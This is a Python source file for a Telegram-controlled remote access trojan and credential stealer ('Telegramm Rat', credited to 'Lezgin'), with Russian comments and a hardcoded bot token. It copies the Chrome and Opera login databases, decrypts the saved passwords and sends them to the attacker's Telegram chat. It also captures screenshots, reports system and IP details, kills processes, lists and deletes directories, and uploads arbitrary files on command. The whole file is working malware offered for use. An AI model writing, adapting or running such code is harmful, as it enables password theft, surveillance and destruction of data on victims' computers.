import telebot, requests
import os
import requests
from PIL import ImageGrab
import shutil
import sqlite3
import win32crypt
import platform
import webbrowser
import time
import subprocess
import ctypes
import cv2
from json import loads 
import socket
import sys
from winreg import *
import winshell
from pyautogui import click, moveTo



bot_token = "840347974:AAFpkW9zo-MNb2ciBYGdyrzean36I6dnDHk"
chat_id = "734963891"
bot = telebot.TeleBot(bot_token)

    
def Chrome():
    text = 'Stealer coded by Lezgin\n\n\nPasswords Chrome:' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                text += '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n'
    return text
file = open(os.getenv("APPDATA") + '\\passwords_chrome.txt', "w+") #
file.write(str(Chrome()) + '\n')
file.close()


@bot.message_handler(commands=['passwords', 'Passwords']) # ПАРОЛИ
def send_passwords(message) :
    if ("{0}".format(message.text) == "/passwords chrome") : # Если сообщение /passwords chrome
        try: 
            Chrome() 
            bot.send_message(chat_id, "Wait...") 
            files = {'document': open(os.getenv("APPDATA") + '\\passwords_chrome.txt','rb')}
            requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id , files=files)
        except: 
            bot.send_message(chat_id, "Ошибка! Браузер запущен!")
    elif ("{0}".format(message.text) == "/passwords opera") : # ИначеЕсли текст /passwords opera
            Opera() 
            bot.send_message(chat_id, "Wait...")
            files = {'document': open(os.getenv("APPDATA") + '\\passwords_opera.txt','rb')}
            requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id , files=files)
    else : 
        bot.send_message(chat_id, "Ошибка! Команда введена неправильно!")



def Opera():
    texto = 'Stealer coded by Lezgin\n\n\nPasswords Opera:' + '\n'
    texto += 'URL | LOGIN | PASSWORD' + '\n'
    if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data'):
        shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data', os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
        conn = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                texto += '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n'
file = open(os.getenv("APPDATA") + '\\passwords_opera.txt', "w+")
file.write(str(Opera()) + '\n')
file.close()




@bot.message_handler(commands=['start', 'Start'])
def send_message(command):
    bot.send_message(chat_id, "Telegramm Rat 1.0.9[BETA]" +
                     "\n\nЧтобы увидеть список команд введи команду /help" +
                     "\nCoded by LEZGIN")


@bot.message_handler(commands=['screen', 'Screen']) 
def send_screen(command) :
    bot.send_message(chat_id, "Wait...") 
    screen = ImageGrab.grab() 
    screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg') 
    screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb') 
    files = {'photo': screen} 
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + chat_id , files=files) 


@bot.message_handler(commands=['help', 'commands', 'Help', 'Commands']) 
def send_help(command):
    bot.send_message(chat_id, "Команды: \n /Screen - Скриншот экрана \n /Check - Инфо о пользователе \n /killprocess имя.exe - Убить процесс(исходя из названия)" +
                    "\n /Direct - Узнать текущую директорию " +
                    "\n /Cmd - Открыть Cmd  \n /Openurl - Открыть ссылку \n /Ls - все папки и файлы в директории" +
                    "\n /Cd директория - перейти в директорию \n /Download - скачать файл \n /Deldir - удалить папку" + 
                    "\n /passwords chrome - получить все пароли гугл \n /passwords opera - получить все пароли опера \n\nАвтор не несет никакой ответствесности за совершеные вами действия!  ")



@bot.message_handler(commands=['check', 'Check']) # ИНФОРМАЦИЯ
def send_info(command) :
    username = os.getlogin()
    
    r = requests.get('http://ip.42.pl/raw')
    IP = r.text
    windows = platform.platform()
    processor = platform.processor()
    systemali = platform.version() 
    bot.send_message(chat_id, "PC: " + username + "\nIP: " + IP + "\nOS: " + windows +
        "\nProcessor: " + processor + "\nVersion OS : " + systemali)



@bot.message_handler(commands=['direct', 'Direct']) # ДИРЕКТОРИЯ
def direct(command) :
    directory = os.path.abspath(os.getcwd())
    bot.send_message(chat_id, "Текущая дериктория: \n" + (str(directory)))



@bot.message_handler(commands=["killprocess", "Killprocess"]) # ПРОЦЕССЫ
def killprocess(message):
 try:   
    user_msg = "{0}".format(message.text)
    subprocess.call("taskkill /IM " + user_msg.split(" ")[1])
    bot.send_message(chat_id, "Готово!")
 except:
     bot.send_message(chat_id, "Ошибка! процесс введен неправильно!")
 


@bot.message_handler(commands=["cmd", "Cmd"]) # CMD
def cmdopen(message) : 
	subprocess.call("cmd")
	bot.send_message(chat_id, "Готово!") # Отправка сообщения



@bot.message_handler(commands=["openurl", "Openurl"]) # ОТКРЫТЬ ССЫЛКУ
def openurl(message):
 try:
    user_msg = "{0}".format(message.text)
    url = user_msg.split(" ")[1]
    webbrowser.open_new_tab(url)
    bot.send_message(chat_id, "Готово!")
 except:
        bot.send_message(chat_id, "Ошибка! ссылка введена неверно!")



@bot.message_handler(commands=["ls", "Ls"]) # ВСЕ ФАЙЛЫ
def lsdir(commands):
 try:
     dirs = '\n'.join(os.listdir(path="."))
     bot.send_message(chat_id, "Files: " + "\n" + dirs)
 except:
     bot.send_message(chat_id, "Ошибка! файл введен неверно!")



@bot.message_handler(commands=["cd", "Cd"]) # ПЕРЕЙТИ В ПАПКУ
def cddir(message):
 try:
    user_msg = "{0}".format(message.text) # Переменная принемающая сообщение от юзера
    folder = user_msg.split(" ")[1]
    os.chdir(folder)
    bot.send_message(chat_id, "Директория изменена на " + folder)
 except:
     bot.send_message(chat_id, "Ошибка! Папка введена неправильно!")



@bot.message_handler(commands =["Download", "download"]) # ЗАГРУЗКА ФАЙЛА
def downloadfile(message):
 try:
    user_msg = "{0}".format(message.text)
    docc = user_msg.split(" ")[1] # Переменная, в которой содержится имя файла
    doccc = {'document': open(docc,'rb')} # Переменная для POST запроса
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id , files=doccc) # Отправляем файл
 except:
     bot.send_message(chat_id, "Ошибка! Файл введен неверно!")


@bot.message_handler(commands = ["deldir", "Deldir"]) # УДАЛИТЬ ПАПКУ
def deletedir(message):
 try:       
    user_msg = "{0}".format(message.text) # Переменная принемающая сообщение от юзера
    path2del = user_msg.split(" ")[1]
    os.removedirs(path2del)
    bot.send_message(chat_id, "Директория " + path2del + " удалена")
 except:
     bot.send_message(chat_id, "Ошибка! Папка введена неверно!")
     
  
bot.polling()
